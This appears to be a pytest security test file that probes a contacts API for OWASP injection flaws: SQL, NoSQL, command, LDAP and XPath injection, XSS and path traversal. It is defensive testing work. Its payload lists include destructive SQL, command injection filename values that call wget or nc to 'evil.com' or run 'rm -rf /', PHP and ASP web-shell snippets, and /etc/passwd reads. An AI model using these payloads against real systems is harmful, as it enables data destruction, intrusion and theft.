"""OWASP A03: Injection tests.

Comprehensive tests for SQL injection, NoSQL injection, command injection,
and other injection vulnerabilities.
"""
import pytest
from tests.conftest import _bearer


class TestSQLInjection:
    """Test for SQL injection vulnerabilities."""

    def test_sql_injection_in_search(self, client, create_contact):
        """Test that search endpoint is vulnerable to SQL injection."""
        create_contact(name="Test Business")
        
        # SQL injection attempts in search
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE contacts;--",
            "'; SELECT * FROM users;--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "1' AND '1'='1",
            "' OR 'a'='a",
        ]
        
        for payload in sql_payloads:
            r = client.get(f"/api/contacts/search?q={payload}")
            # Should either return empty results or error, not leak data
            assert r.status_code in [200, 400, 422]
            if r.status_code == 200:
                # Should not contain sensitive table data
                data = r.json()
                # Basic validation that response is reasonable
                assert isinstance(data, (list, dict))

    def test_sql_injection_in_contact_name(self, client, user_headers):
        """Test that contact creation rejects SQL injection in name field."""
        sql_payloads = [
            "Test'; DROP TABLE contacts;--",
            "Test' OR '1'='1",
            "Test' UNION SELECT * FROM users--",
        ]
        
        for payload in sql_payloads:
            r = client.post(
                "/api/contacts",
                headers=user_headers,
                json={"name": payload, "phone": "1234567"}
            )
            # Should either reject or sanitize
            assert r.status_code in [201, 400, 422]

    def test_sql_injection_in_category_filter(self, client, create_contact):
        """Test SQL injection in category filtering."""
        create_contact(name="Test Business")
        
        payloads = [
            "100 OR 1=1",
            "100 UNION SELECT *",
            "100' OR '1'='1",
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts?category={payload}")
            assert r.status_code in [200, 400, 422]

    def test_sql_injection_in_sort_parameter(self, client, create_contact):
        """Test SQL injection via ORDER BY parameter."""
        create_contact(name="Test Business")
        
        # Dangerous ORDER BY payloads
        payloads = [
            "name; DROP TABLE contacts--",
            "name UNION SELECT password_hash FROM users",
            "1; DELETE FROM contacts WHERE '1'='1",
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts?sort={payload}")
            # Should not execute malicious SQL
            assert r.status_code in [200, 400, 422]

    def test_sql_injection_in_pagination(self, client, create_contact):
        """Test SQL injection in limit/offset parameters."""
        create_contact(name="Test Business")
        
        payloads = [
            "100; DROP TABLE contacts",
            "0 UNION SELECT * FROM users",
            "1,1000",
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts?limit={payload}")
            assert r.status_code in [200, 400, 422]

    def test_blind_sql_injection_detection(self, client, create_contact):
        """Test for blind SQL injection via timing."""
        create_contact(name="Test Business")
        
        # Time-based blind SQL injection
        payloads = [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR (SELECT COUNT(*) FROM users) > 0 AND '1'='1",
        ]
        
        import time
        for payload in payloads:
            start = time.time()
            r = client.get(f"/api/contacts/search?q={payload}")
            elapsed = time.time() - start
            
            # If response takes > 2 seconds, might be vulnerable
            # But in test environment, should be fast
            assert r.status_code in [200, 400, 422]
            assert elapsed < 5, "Potential blind SQL injection detected"


class TestNoSQLInjection:
    """Test for NoSQL injection vulnerabilities (if using MongoDB-like patterns)."""

    def test_nosql_injection_in_login(self, client, create_user):
        """Test NoSQL injection in authentication."""
        # Create unique user to avoid constraint conflicts
        import uuid
        unique_id = str(uuid.uuid4())[:8]
        create_user(email=f"test{unique_id}@test.com", username=f"testuser{unique_id}")
        
        # NoSQL injection payloads (for MongoDB-like databases)
        payloads = [
            {"username_or_email": {"$ne": ""}, "password": {"$ne": ""}},
            {"username_or_email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        ]
        
        for payload in payloads:
            r = client.post("/api/auth/login", json=payload)
            # Should not authenticate with injection
            assert r.status_code in [401, 422]

    def test_nosql_injection_in_search(self, client, create_contact):
        """Test NoSQL injection in search parameters."""
        create_contact(name="Test Business")
        
        payloads = [
            {"q": {"$ne": ""}},
            {"q": {"$regex": ".*"}},
            {"$where": "this.name.length > 0"},
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts/search", params=payload)
            assert r.status_code in [200, 400, 422]


class TestCommandInjection:
    """Test for command injection vulnerabilities."""

    def test_command_injection_in_filename(self, client, user_headers, create_contact):
        """Test command injection in file upload filename."""
        contact = create_contact()
        
        # Command injection via filename (if file upload exists)
        payloads = [
            "test.jpg; rm -rf /",
            "test.jpg && wget evil.com",
            "test.jpg | nc evil.com 1234",
            "test.jpg`whoami`",
            "test.jpg$(whoami)",
        ]
        
        for payload in payloads:
            # This would require actual file upload endpoint
            # Placeholder for where command injection could occur
            pass

    def test_command_injection_in_image_processing(self, client, user_headers, create_contact):
        """Test command injection in image processing parameters."""
        contact = create_contact()
        
        # If there's image processing with user-controlled parameters
        payloads = [
            "test.png; cat /etc/passwd",
            "test.png && ls /",
            "test.png | id",
        ]
        
        # Placeholder - would test actual image processing endpoints


class TestLDAPInjection:
    """Test for LDAP injection vulnerabilities (if LDAP is used)."""

    def test_ldap_injection_in_login(self, client):
        """Test LDAP injection in login parameters."""
        if hasattr(client.app, 'ldap'):  # Only if LDAP is used
            payloads = [
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*)",
                ")(objectClass=*",
            ]
            
            for payload in payloads:
                r = client.post("/api/auth/login", json={
                    "username_or_email": payload,
                    "password": "test"
                })
                assert r.status_code in [401, 422]


class TestXPathInjection:
    """Test for XPath injection (if XML data storage is used)."""

    def test_xpath_injection_in_search(self, client):
        """Test XPath injection in search."""
        payloads = [
            "' or '1'='1",
            "' or 1=1--",
            "admin' and password='",
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts/search?q={payload}")
            assert r.status_code in [200, 400, 422]


class TestInjectionPrevention:
    """Test that injection prevention mechanisms are in place."""

    def test_input_sanitization_in_search(self, client, create_contact):
        """Test that search input is properly sanitized."""
        create_contact(name="Test Business")
        
        # Try various injection patterns
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<% eval request('cmd') %>",
            "../../../etc/passwd",
            "file:///etc/passwd",
        ]
        
        for input in dangerous_inputs:
            r = client.get(f"/api/contacts/search?q={input}")
            # Should either reject or sanitize, not execute
            assert r.status_code in [200, 400, 422]
            if r.status_code == 200:
                # Verify no file contents or code is returned
                data = r.json()
                if isinstance(data, list):
                    for item in data:
                        for key, value in item.items():
                            if isinstance(value, str):
                                assert "root:" not in value  # No /etc/passwd
                                assert "<?" not in value    # No PHP code

    def test_parameterized_queries_used(self, client, create_contact):
        """Verify that parameterized queries prevent injection."""
        create_contact(name="Test")
        
        # Try to break the query with special characters
        r = client.get('/api/contacts/search?q=" OR "1"="1')
        assert r.status_code in [200, 400, 422]
        
        r = client.get("/api/contacts/search?q=' OR 1=1--")
        assert r.status_code in [200, 400, 422]

    def test_wildcard_injection_prevention(self, client, create_contact):
        """Test that wildcards in search are handled safely."""
        create_contact(name="Test Business")
        
        # Try wildcard injection
        r = client.get("/api/contacts/search?q=%")
        assert r.status_code in [200, 400]
        
        r = client.get("/api/contacts/search?q=_")
        assert r.status_code in [200, 400, 422]

    def test_unicode_injection_prevention(self, client, create_contact):
        """Test that Unicode injection attempts are handled."""
        create_contact(name="Test Business")
        
        unicode_payloads = [
            "%27",  # URL-encoded quote
            "%22",  # URL-encoded double quote
            "%3B",  # URL-encoded semicolon
            "%2F",  # URL-encoded slash
        ]
        
        for payload in unicode_payloads:
            r = client.get(f"/api/contacts/search?q={payload}")
            assert r.status_code in [200, 400, 422]